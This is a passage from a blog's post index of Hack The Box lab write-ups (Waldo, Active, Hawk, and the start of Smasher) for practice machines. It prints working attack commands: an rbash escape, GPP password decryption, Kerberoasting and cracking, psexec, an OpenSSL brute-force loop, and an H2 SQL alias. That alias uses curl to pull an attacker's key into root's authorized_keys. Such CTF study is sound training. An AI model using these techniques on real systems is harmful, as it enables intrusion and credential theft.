binmonitor@waldo:~$ cd bin-rbash: cd: restrictedmonitor@waldo:~$ lsapp-dev  binmonitor@waldo:~$ ls binls  most  red  rnanomonitor@waldo:~$ We can easily bypass rbash by skipping the profile of the user with the -t bash --noprofile arguments:waldo:~/.ssh$ ssh -i .monitor monitor@127.0.0.1 -t bash --noprofilemonitor@waldo:~$ However our PATH is no longer set so we‚Äôll need to set it manually:monitor@waldo:~$ echo $PATH/home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1monitor@waldo:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATHmonitor@waldo:~$ echo $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1Now that we have access with a regular shell, we can start looking around.In the app-dev directory of the monitor home directory, there is a log monitoring application along with the source code. The application simply reads hardcoded log files based on the CLI argument passed to it:[...]case 'a' :          strncpy(filename, \"/var/log/auth.log\", sizeof(filename));          printFile(filename);          break;        case 'A' :          strncpy(filename, \"/var/log/alternatives.log\", sizeof(filename));          printFile(filename);          break;        case 'b' :          strncpy(filename, \"/var/log/btmp\",sizeof(filename));          printFile(filename);          break;        case 'd' :          strncpy(filename, \"/var/log/daemon.log\",sizeof(filename));          printFile(filename);          break;        case 'D' :          strncpy(filename, \"/var/log/dpkg.log\",sizeof(filename));          printFile(filename);          break;[...]We can modify the source code and re-compile it but it‚Äôs not running as root so any modifications we make like adding a /bin/bash shell argument option will only result in a shell running as user monitor. At first, it seemed like this was a box with a cronjob running every few minutes that would compile and run the program but this isn‚Äôt the case.Next, we looked at the v0.1 directory that contains yet another copy of the software. The interesting part here is that the application is able to read log files even though it doesn‚Äôt have the SUID bit set:monitor@waldo:~/app-dev$ ./logMonitor -aCannot open filemonitor@waldo:~/app-dev/v0.1$ ./logMonitor-0.1 -aAug  4 21:17:01 waldo CRON[938]: pam_unix(cron:session): session opened for user root by (uid=0)Aug  4 21:17:01 waldo CRON[938]: pam_unix(cron:session): session closed for user rootAug  4 22:00:37 waldo sshd[980]: Accepted publickey for monitor from 127.0.0.1 port 57202 ssh2: RSA SHA256:Kl+zDjbDx4fQ7xVvGg6V3RhjezqB1gfe2kWqm1AMD0c[...]monitor@waldo:~/app-dev$ ls -l logMonitor-rwxrwx--- 1 app-dev monitor 13704 Jul 24 08:10 logMonitormonitor@waldo:~/app-dev$ ls -l v0.1/logMonitor-0.1 -r-xr-x--- 1 app-dev monitor 13706 May  3 16:50 v0.1/logMonitor-0.1So, both files are owned by the same user and do not have the SUID bit set‚Ä¶ Why is the v0.1 file able to read log files then?Let‚Äôs look at file capabilities:monitor@waldo:~$ getcap -r *app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+eiThe cap_dac_read_search capability is used to Bypass file read permission checks and directory read and execute permission checks. So basically, if a file has this permission it can read anything.We can‚Äôt use this file to read anything other than log files but maybe there are other similar files on the host:monitor@waldo:~$ getcap -r /* 2&gt;/dev/null/home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei/usr/bin/tac = cap_dac_read_search+eiWhat is this tac binary?monitor@waldo:~$ /usr/bin/tac --helpUsage: /usr/bin/tac [OPTION]... [FILE]...Write each FILE to standard output, last line first.Ok, we can use this to read files, let‚Äôs grab root.txt and finish this box:monitor@waldo:~$ tac /root/root.txt8fb67c&lt;redacted&gt;"
  },
  
  {
    "title": "Active - Hack The Box",
    "url": "/posts/htb-writeup-active/",
    "categories": "hackthebox, infosec",
    "tags": "hackthebox, kerberos, ad",
    "date": "2018-12-08 00:00:00 +0800",
    





    
    "snippet": "Windows / 10.10.10.100This blog post is a writeup for Active from Hack the Box.Summary  There‚Äôs a GPP file with user credentials on the replication share of the DC which we can can crack with gpp-d...",
    "content": "Windows / 10.10.10.100This blog post is a writeup for Active from Hack the Box.Summary  There‚Äôs a GPP file with user credentials on the replication share of the DC which we can can crack with gpp-decrypt  We then grab an encrypted ticket using the Kerberoasting technique and recover the Administrator passwordTools/Blogs  gpp-decrypt  Impacket  PyKerberoastDetailed stepsNmapThis Windows Server is running kerberos on port 88 so it‚Äôs probably an Active Directory serverroot@violentunicorn:~/hackthebox# nmap -F 10.10.10.100Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-28 20:19 EDTNmap scan report for active.htb (10.10.10.100)Host is up (0.16s latency).Not shown: 89 closed portsPORT      STATE SERVICE53/tcp    open  domain88/tcp    open  kerberos-sec135/tcp   open  msrpc139/tcp   open  netbios-ssn389/tcp   open  ldap445/tcp   open  microsoft-ds49152/tcp open  unknown49153/tcp open  unknown49154/tcp open  unknown49155/tcp open  unknown49157/tcp open  unknownNmap done: 1 IP address (1 host up) scanned in 1.83 secondsEnumerating the SMB replication sahreAll sorts of interesting ports are open on the server. First, let‚Äôs check which shares are publicly accessible:root@violentunicorn:~# enum4linux 10.10.10.100 ========================================= |    Share Enumeration on 10.10.10.100    | ========================================= WARNING: The \"syslog\" option is deprecated  Sharename       Type      Comment  ---------       ----      -------  ADMIN$          Disk      Remote Admin  C$              Disk      Default share  IPC$            IPC       Remote IPC  NETLOGON        Disk      Logon server share   Replication     Disk        SYSVOL          Disk      Logon server share   Users           Disk      Reconnecting with SMB1 for workgroup listing.Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)Failed to connect with SMB1 -- no workgroup available[+] Attempting to map shares on 10.10.10.100//10.10.10.100/ADMIN$ Mapping: DENIED, Listing: N/A//10.10.10.100/C$ Mapping: DENIED, Listing: N/A//10.10.10.100/IPC$ Mapping: OK Listing: DENIED//10.10.10.100/NETLOGON Mapping: DENIED, Listing: N/A//10.10.10.100/Replication  Mapping: OK, Listing: OK//10.10.10.100/SYSVOL Mapping: DENIED, Listing: N/A//10.10.10.100/Users  Mapping: DENIED, Listing: N/ASo IPC$ and Replication are open, let‚Äôs check Replication‚Ä¶root@violentunicorn:~# smbclient -N -U \"\" //10.10.10.100/ReplicationWARNING: The \"syslog\" option is deprecatedTry \"help\" to get a list of possible commands.smb: \\&gt; ls  .                                   D        0  Sat Jul 21 06:37:44 2018  ..                                  D        0  Sat Jul 21 06:37:44 2018  active.htb                          D        0  Sat Jul 21 06:37:44 2018    10459647 blocks of size 4096. 6312288 blocks availablesmb: \\&gt; cd active.htbsmb: \\active.htb\\&gt; ls  .                                   D        0  Sat Jul 21 06:37:44 2018  ..                                  D        0  Sat Jul 21 06:37:44 2018  DfsrPrivate                       DHS        0  Sat Jul 21 06:37:44 2018  Policies                            D        0  Sat Jul 21 06:37:44 2018  scripts                             D        0  Wed Jul 18 14:48:57 2018    10459647 blocks of size 4096. 6312288 blocks availablesmb: \\active.htb\\&gt; cd Policiessmb: \\active.htb\\Policies\\&gt; ls  .                                   D        0  Sat Jul 21 06:37:44 2018  ..                                  D        0  Sat Jul 21 06:37:44 2018  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Sat Jul 21 06:37:44 2018  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Sat Jul 21 06:37:44 2018    10459647 blocks of size 4096. 6312288 blocks availablesmb: \\active.htb\\Policies\\&gt; cd {31B2F340-016D-11D2-945F-00C04FB984F9}smb: \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\&gt; ls  .                                   D        0  Sat Jul 21 06:37:44 2018  ..                                  D        0  Sat Jul 21 06:37:44 2018  GPT.INI                             A       23  Wed Jul 18 16:46:06 2018  Group Policy                        D        0  Sat Jul 21 06:37:44 2018  MACHINE                             D        0  Sat Jul 21 06:37:44 2018  USER                                D        0  Wed Jul 18 14:49:12 2018    10459647 blocks of size 4096. 6312288 blocks availablesmb: \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\&gt; cd machinelsmb: \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\machine\\&gt; ls  .                                   D        0  Sat Jul 21 06:37:44 2018  ..                                  D        0  Sat Jul 21 06:37:44 2018  Microsoft                           D        0  Sat Jul 21 06:37:44 2018  Preferences                         D        0  Sat Jul 21 06:37:44 2018  Registry.pol                        A     2788  Wed Jul 18 14:53:45 2018    10459647 blocks of size 4096. 6312288 blocks availablesmb: \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\machine\\&gt; cd preferenceslsmb: \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\machine\\preferences\\&gt; ls  .                                   D        0  Sat Jul 21 06:37:44 2018  ..                                  D        0  Sat Jul 21 06:37:44 2018  Groups                              D        0  Sat Jul 21 06:37:44 2018    10459647 blocks of size 4096. 6312288 blocks availablesmb: \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\machine\\preferences\\&gt; cd groupslssmb: \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\machine\\preferences\\groups\\&gt; ls  .                                   D        0  Sat Jul 21 06:37:44 2018  ..                                  D        0  Sat Jul 21 06:37:44 2018  Groups.xml                          A      533  Wed Jul 18 16:46:06 2018    10459647 blocks of size 4096. 6312288 blocks availablesmb: \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\machine\\preferences\\groups\\&gt; get groups.xmlgetting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\machine\\preferences\\groups\\groups.xml of size 533 as groups.xml (1.6 KiloBytes/sec) (average 1.6 KiloBytes/sec)smb: \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\machine\\preferences\\groups\\&gt; exitSo we just found Group Policy Preferences in a file, with encrypted credentials.root@violentunicorn:~# cat groups.xml&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;Groups clsid=\"{3125E937-EB16-4b4c-9934-544FC6D24D26}\"&gt;&lt;User clsid=\"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name=\"active.htb\\SVC_TGS\" image=\"2\" changed=\"2018-07-18 20:46:06\" uid=\"{EF57DA28-5F69-4530-A59E-AAB58578219D}\"&gt;&lt;Properties action=\"U\" newName=\"\" fullName=\"\" description=\"\" cpassword=\"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\" changeLogon=\"0\" noChange=\"1\" neverExpires=\"1\" acctDisabled=\"0\" userName=\"active.htb\\SVC_TGS\"/&gt;&lt;/User&gt;&lt;/Groups&gt;Luckily, the encryption key for this has been leaked by Microsoft a few years ago and we can decrypt it using gpp-decrypt:root@violentunicorn:~# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecatedGPPstillStandingStrong2k18So we now have the following user account‚Äôs credentials:  Username: SVC_TGS  Password: GPPstillStandingStrong2k18We can log in with that account and recover the user flag:root@violentunicorn:~# smbclient -U svc_tgs //10.10.10.100/UsersWARNING: The \"syslog\" option is deprecatedEnter WORKGROUP\\svc_tgs's password: Try \"help\" to get a list of possible commands.smb: \\&gt; cd svc_tgssmb: \\svc_tgs\\&gt; cd desktopsmb: \\svc_tgs\\desktop\\&gt; get user.txtgetting file \\svc_tgs\\desktop\\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)smb: \\svc_tgs\\desktop\\&gt; exitroot@violentunicorn:~# cat user.txt86d67d&lt;redacted&gt;KerberoastingNext, we‚Äôll look for Service Principal Names and encrypted service tickets that we can crack to recover other credentials.We‚Äôll use PyKerberoast for this since we are on Kali and not Windows.root@violentunicorn:~/PyKerberoast# python kerberoastv2.py -a 10.10.10.100 -b cn=users,dc=active,dc=htb -d active -u svc_tgs -p GPPstillStandingStrong2k18[+]Starting...$krb5tgs$18$*krbtgt$ACTIVE.HTB$spn*$cabf481b2b4dbd9567c5bee15e9d2ec9$04f2407e7fadab18a8f8ebda0e66af92e91c305098340e701383738a9cd317b15024815917af864e679ae02f8b610e18842308a54a9f0a2095ab688a972c5e03903f5d2cbf2d72cc5894ff6fa45413b95a1c94ee8fd1c9e8990c95748ba93a83bc078b3653b678a60fa0eb42cdaccdb3b4e5d5d97925676059c5b3495ce37a1fc964cf7cdeba452811d52a103633ffc5033709c3a2ac0f4f0a6aa06700b2817956c37c2f20e4ef5684b41d3f87e3f7fd80ed51088ef648f874b5fe113b5da0ebe5c7e77d63945ca190bb1dab377f75f6da85cbc261635fefdd42e621ac711c26c87d99b761941330e010fec48fd06219cd1aa7a8e91c9b0f36728ca30e68128db767e2e54c57d185b0700c03e7eb66fa62903971cdca7d481e4d4db09cc22a943ddb8ead77b4a2f2fc5cac6f34a6af8e796b5dd9f2e4310af99271a64af70c2c3aacfb8820b805d8efb3899e7a4d22c5adbf33f970e8fa7ce8ea79ad83a265aa3a4af2464d7cb296333199251a27f2fc189935f87c116e9143accd254ba4fb5d2a6f80af535076afbf8a89bea83941f703d312605d7fadc5d6583c9a86463ddc69165bdb0aabeab30edee51032dc160e3e349eb2f0c465f891015b7a127c9ef47949fdba2c1e2392d0cee6d03f54e5d36e63be681d1d2ad084c0f892b447352039488f21c184d7d0d5d68c0f15197579217ac48d3f1770710e5e0af95140d7394aae11371fd098b9591a1f6de4d4448db180a612917a8b0309e1b1a443d52d40f974e1036406c0aacf46b3be2286408cacd0c55a0e3146e7226cf6ab9c5d1b2af6939eac9c750c652f02925ab0549c3fd56f3655ceb37ec368dc24c034e6030a1b25dac3691e80098547a08b638560f2ffd37dcde83df28152fcbc9a93d9ef11a2e84f5b8efd3c8489983dceb394d22969d9c86b06af4b6633c55d86f61d1feac5dd4c541fa4e405b2b2e5fc41622833a45026dfef1e7a04b0577f2b5229b68e12af85af2cc074c3aae267c1c942cea9bcb21640bd2d0fe75996f93623e5cbaab186b7cedef4c1db1240b5c8cbb486f50bc7fafed38cd40a7605a6511d0cd393c8aa1c0387c7df9bd8c9a3f3af3eb2fe6341a88c6fac220f53725cd574f92c75e1f1a47be01a1a6bbf865fef2a681b981f2a2cf126797b7fcab95315c430f46e6140266d693e41dfb964c5f80e88ebb6c04cbe6299ef0f5cab31e8e75278474633d33251029cf0cdd2c40fe4678581ecdd193b7eac40[+]Done!Sweet, we got a ticket for the Administrator user! Let‚Äôs brute force this bitch now.Password crackingBecause this is HTB, the password is in the rockyou.txt file:root@violentunicorn:~/JohnTheRipper/run# ~/JohnTheRipper/run/john -w=/usr/share/wordlists/rockyou.txt hash.txtUsing default input encoding: UTF-8Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])Will run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusTicketmaster1968 (?)1g 0:00:00:39 DONE (2018-07-28 20:50) 0.02515g/s 265093p/s 265093c/s 265093C/s Tiffani1432..Tiago_18Use the \"--show\" option to display all of the cracked passwords reliablySession completedOk, nice we now have the Administrator password: Ticketmaster1968Remote access using psexecWe could just grab the flag using smbclient but we‚Äôll try to get a proper shell using psexec:root@violentunicorn:~# psexec.py administrator:Ticketmaster1968@10.10.10.100Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies[*] Requesting shares on 10.10.10.100.....[*] Found writable share ADMIN$[*] Uploading file xZMcKohO.exe[*] Opening SVCManager on 10.10.10.100.....[*] Creating service vTmo on 10.10.10.100.....[*] Starting service vTmo.....[!] Press help for extra shell commandsMicrosoft Windows [Version 6.1.7600]Copyright (c) 2009 Microsoft Corporation.  All rights reserved.C:\\Windows\\system32&gt;whoamint authority\\systemC:\\Windows\\system32&gt;cd \\users\\administrator\\desktopC:\\Users\\Administrator\\Desktop&gt;type root.txtb5fc76&lt;redacted&gt;"
  },
  
  {
    "title": "Hawk - Hack The Box",
    "url": "/posts/htb-writeup-hawk/",
    "categories": "hackthebox, infosec",
    "tags": "hackthebox, drupal",
    "date": "2018-12-01 00:00:00 +0800",
    





    
    "snippet": "Linux / 10.10.10.102This blog post is a quick writeup of Hawk from Hack the Box.Summary  The server is running an FTP server, a Drupal website and an H2 database (which is not accessible remotely) ...",
    "content": "Linux / 10.10.10.102This blog post is a quick writeup of Hawk from Hack the Box.Summary  The server is running an FTP server, a Drupal website and an H2 database (which is not accessible remotely)  There is an OpenSSL encrypted file on the publicly accessible FTP server  We can bruteforce the key using a bash script and the openssl command  The file contains the password for the Drupal admin account  Once we are logged in to Drupal, we can create a PHP file that creates a reverse shell  The shell gets us www-data and we can find the connection password in the Drupal configuration file  We can log in as user daniel with the password we found  The normal /bin/bash shell for user daniel has been replaced by python, which we can escape using pty.spawn  Looking at the running processes, we find that the H2 database is running as root  We can access the web interface by creating an SSH reverse tunnel back to our Kali machine  The sa username is using the default empty password but we can log in by changing the URL to anything other than the default string  Once logged in, we can execute commands as root using H2 SQL commandsTools/Blogs  https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.htmlDetailed stepsNmapServices running:  FTP  SSH  Apache  5435 (?)  H2 database (Web &amp; TCP interface)root@violentunicorn:~/hackthebox/Machines/Hawk# nmap -p- 10.10.10.102Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-14 19:26 EDTNmap scan report for hawk.htb (10.10.10.102)Host is up (0.017s latency).Not shown: 65529 closed portsPORT     STATE SERVICE21/tcp   open  ftp22/tcp   open  ssh80/tcp   open  http5435/tcp open  sceanics8082/tcp open  blackice-alerts9092/tcp open  XmlIpcRegSvcNmap done: 1 IP address (1 host up) scanned in 10.50 secondsServices enumerationDrupal is running on Port 80.H2‚Äôs database is not accessible on the HTTP port:H2 ConsoleSorry, remote connections ('webAllowOthers') are disabled on this server. H2‚Äôs database is not accessible on the TCP port:root@violentunicorn:~/Hawk# telnet 10.10.10.102 9092Trying 10.10.10.102...Connected to 10.10.10.102.Escape character is '^]'.90117FRemote connections to this server are not allowed, see -tcpAllowOthersÔøΩÔøΩ\u0001`\u0001ÔøΩorg.h2.jdbc.JdbcSQLException: Remote connections to this server are not allowed, see -tcpAllowOthers [90117-196]  at org.h2.message.DbException.getJdbcSQLException(DbException.java:345)  at org.h2.message.DbException.get(DbException.java:179)  at org.h2.message.DbException.get(DbException.java:155)  at org.h2.message.DbException.get(DbException.java:144)  at org.h2.server.TcpServerThread.run(TcpServerThread.java:82)  at java.base/java.lang.Thread.run(Thread.java:844)Connection closed by foreign host.FTP recon &amp; credentials fileAnonymous access is allowed on the server and there‚Äôs a single file we can download.root@violentunicorn:~/hackthebox/Machines/Hawk# ftp 10.10.10.102Connected to 10.10.10.102.220 (vsFTPd 3.0.3)Name (10.10.10.102:root): anonymous230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.drwxr-xr-x    2 ftp      ftp          4096 Jun 16 22:21 messages226 Directory send OK.ftp&gt; cd messages250 Directory successfully changed.ftp&gt; ls -la200 PORT command successful. Consider using PASV.150 Here comes the directory listing.drwxr-xr-x    2 ftp      ftp          4096 Jun 16 22:21 .drwxr-xr-x    3 ftp      ftp          4096 Jun 16 22:14 ..-rw-r--r--    1 ftp      ftp           240 Jun 16 22:21 .drupal.txt.enc226 Directory send OK.ftp&gt; get .drupal.txt.enclocal: .drupal.txt.enc remote: .drupal.txt.enc200 PORT command successful. Consider using PASV.150 Opening BINARY mode data connection for .drupal.txt.enc (240 bytes).226 Transfer complete.240 bytes received in 0.00 secs (3.4679 MB/s)The file contains a base64 encoded OpenSSL encrypted fileroot@violentunicorn:~/hackthebox/Machines/Hawk# cat drupal.txt.enc U2FsdGVkX19rWSAG1JNpLTawAmzz/ckaN1oZFZewtIM+e84km3Csja3GADUg2jJbCmSdwTtr/IIShvTbUd0yQxfe9OuoMxxfNIUN/YPHx+vVw/6eOD+Cc1ftaiNUEiQzQUf9FyxmCb2fuFoOXGphAMo+Pkc2ChXgLsj4RfgX+P7DkFa8w1ZA9Yj7kR+tyZfyt4M0qvmWvMhAj3fuuKCCeFoXpYBOacGvUHRGywb4YCk=root@violentunicorn:~/hackthebox/Machines/Hawk# base64 -d drupal.txt.enc &gt; drupal-decoded.txt.enc root@violentunicorn:~/hackthebox/Machines/Hawk# file drupal-decoded.txt.encdrupal-decoded.txt.enc: openssl enc'd data with salted passwordTo brute-force the file, I‚Äôve tried using bruteforce-salted-openssl but that tools is shit so I made my own script that does the same thing.for pwd in $(cat /root/SecLists/Passwords/rockyou-75.txt)  do openssl enc -aes-256-cbc -d -a -in drupal.txt.enc -out file.txt -k $pwd  if [ $? -eq 0 ]  then    exit 1  fidoneThe file contains a password:root@violentunicorn:~/hackthebox/Machines/Hawk# cat file.txt Daniel,Following the password for the portal:PencilKeyboardScanner123Please let us know when the portal is ready.Kind Regards,IT departmentDrupalSo first we‚Äôll log on to Drupal with:  Username: admin  Password: PencilKeyboardScanner123Next we need to enable PHP filters so we can embed PHP in pages.Then we‚Äôll create a PHP page with a simple reverse shell.root@violentunicorn:~# nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.102] 53700/bin/sh: 0: can't access tty; job control turned off$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)$ cd /home$ lsdaniel$ cd daniel$ lsuser.txt$ cat user.txtd5111d&lt;redacted&gt;We can find that there is another user: daniel$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologinsyslog:x:102:106::/home/syslog:/usr/sbin/nologinmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin_apt:x:104:65534::/nonexistent:/usr/sbin/nologinlxd:x:105:65534::/var/lib/lxd/:/bin/falseuuidd:x:106:110::/run/uuidd:/usr/sbin/nologindnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinlandscape:x:108:112::/var/lib/landscape:/usr/sbin/nologinpollinate:x:109:1::/var/cache/pollinate:/bin/falsesshd:x:110:65534::/run/sshd:/usr/sbin/nologintomcat:x:1001:46::/opt/tomat/temp:/sbin/nologinmysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/falsedaniel:x:1002:1005::/home/daniel:/usr/bin/python3ftp:x:112:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologinDebian-snmp:x:113:116::/var/lib/snmp:/bin/falseGetting access to user danielIn /var/www/html/sites/default/settings.php we find some credentials:$databases = array (  'default' =&gt;   array (    'default' =&gt;     array (      'database' =&gt; 'drupal',      'username' =&gt; 'drupal',      'password' =&gt; 'drupal4hawk',      'host' =&gt; 'localhost',      'port' =&gt; '',      'driver' =&gt; 'mysql',      'prefix' =&gt; '',    ),  ),);Password: drupal4hawkWe can log in as user daniel with this password:root@violentunicorn:~# ssh daniel@10.10.10.102daniel@10.10.10.102's password: Last login: Sun Jul  1 13:46:16 2018 from dead:beef:2::1004Python 3.6.5 (default, Apr  1 2018, 05:46:30) [GCC 7.3.0] on linuxType \"help\", \"copyright\", \"credits\" or \"license\" for more information.&gt;&gt;&gt; We can escape this python interactive shell with:&gt;&gt;&gt; import pty&gt;&gt;&gt; pty.spawn(\"/bin/bash\")daniel@hawk:~$ iduid=1002(daniel) gid=1005(daniel) groups=1005(daniel)Privesc using H2 databaseTo access the H2 database remotely, we‚Äôll do an SSH reverse tunnel:daniel@hawk:~$ ssh -R 8082:localhost:8082 root@10.10.14.23The authenticity of host '10.10.14.23 (10.10.14.23)' can't be established.ECDSA key fingerprint is SHA256:F1UaVc5s2w2++Hm8MXsITptkhljyxkLiczC12e3U2nA.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added '10.10.14.23' (ECDSA) to the list of known hosts.root@10.10.14.23's password: Linux violentunicorn 4.15.0-kali3-amd64 #1 SMP Debian 4.15.17-1kali1 (2018-04-25) x86_64The programs included with the Kali GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sat Jul 14 18:49:44 2018 from 10.10.10.102We can then access the login page.We have access to the preferences and we can enable remote access.We can‚Äôt log in with the default URL because the relative path is causing problems.If we change the URL to something else we can write to, we are able to log in.Next, we‚Äôll use a shellexec() command to gain RCE on the server:In this case we are dropping our SSH public key in the root authorized_keys file:CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\"); return s.hasNext() ? s.next() : \"\";  }$$;CALL SHELLEXEC('curl 10.10.14.23/id_rsa.pub -o /root/.ssh/authorized_keys')We can then log in as root and grab the root flag:root@violentunicorn:~/.ssh# ssh root@10.10.10.102Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-23-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Sun Jul 15 00:00:21 UTC 2018  System load:  0.03              Processes:            113  Usage of /:   54.1% of 9.78GB   Users logged in:      1  Memory usage: 57%               IP address for ens33: 10.10.10.102  Swap usage:   0% * Meltdown, Spectre and Ubuntu: What are the attack vectors,   how the fixes work, and everything else you need to know   - https://ubu.one/u2Know * Canonical Livepatch is available for installation.   - Reduce system reboots and improve kernel security. Activate at:     https://ubuntu.com/livepatch55 packages can be updated.3 updates are security updates.Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Sat Jul 14 21:09:40 2018root@hawk:~# cat root.txt54f3e8&lt;redacted&gt;"
  },
  
  {
    "title": "Smasher - Hack The Box",
    "url": "/posts/htb-writeup-smasher/",
    "categories": "hackthebox, infosec",
    "tags": "hackthebox, binary exploit",
    "date": "2018-11-24 00:00:00 +0800",
    





    
    "snippet": "Linux / 10.10.10.89This blog post is a writeup of the excellent Hack the Box machine created by dzonerzy.Summary  The webserver used is vulnerable to a path traversal bug and buffer overflow in the...",
    "content": "Linux / 10.10.10.89This blog post is a writeup of the excellent Hack the Box machine created by dzonerzy.Summary  The webserver used is vulnerable to a path traversal bug and buffer overflow in the GET parameter  By using the path traversal bug we can get the Makefile and copy of the webserver executable  The buffer overflow can be solved by leaking libc‚Äôs base address and then building a ropchain to ret2libc  To gain user, we have to solve an Oracle padding challenge that gives us the user password  Priv esc is a race condition in a suid root ELF binary, we can swap out the file with a symlink to /root/root.txt to get the root flagTools used  pwntools  https://libc.blukat.me/  https://github.com/twd2/padding-oracle-attack/blob/master/attack.pyNmapQuick port scan reveals a webserver running on a non standard port 1111.root@kali:~/hackthebox# nmap -sC -sV 10.10.10.89Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-11 20:09 EDTNmap scan report for 10.10.10.89Host is up (0.017s latency).Not shown: 998 closed portsPORT     STATE SERVICE         VERSION22/tcp   open  ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 a6:23:c5:7b:f1:1f:df:68:25:dd:3a:2b:c5:74:00:46 (RSA)|   256 57:81:a5:46:11:33:27:53:2b:99:29:9a:a8:f3:8e:de (ECDSA)|_  256 c5:23:c1:7a:96:d6:5b:c0:c4:a5:f8:37:2e:5d:ce:a0 (ED25519)1111/tcp open  lmsocialserver?| fingerprint-strings: |   FourOhFourRequest, GenericLines, SIPOptions: |     HTTP/1.1 404 Not found|     Server: shenfeng tiny-web-server|     Content-length: 14|     File not found|   GetRequest, HTTPOptions, RTSPRequest: |     HTTP/1.1 200 OK|     Server: shenfeng tiny-web-server|     Content-Type: text/html|     &lt;html&gt;&lt;head&gt;&lt;style&gt;body{font-family: monospace; font-size: 13px;}td {padding: 1.5px 6px;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;table&gt;|     &lt;tr&gt;&lt;td&gt;&lt;a href=\"index.html\"&gt;index.html&lt;/a&gt;&lt;/td&gt;&lt;td&gt;2018-03-31 00:57&lt;/td&gt;&lt;td&gt;2.1K&lt;/td&gt;&lt;/tr&gt;|_    &lt;/table&gt;&lt;/body&gt;&lt;/html&gt;Web serviceBased on the banner, we know the website is running using the tiny-web-server server application.There‚Äôs already an issue documented for this application about a path traversal vulnerability.We can walk the file system by doing a GET ../../../../&lt;file&gt;, and it also works for directories so we can get a directory listing.I wrote 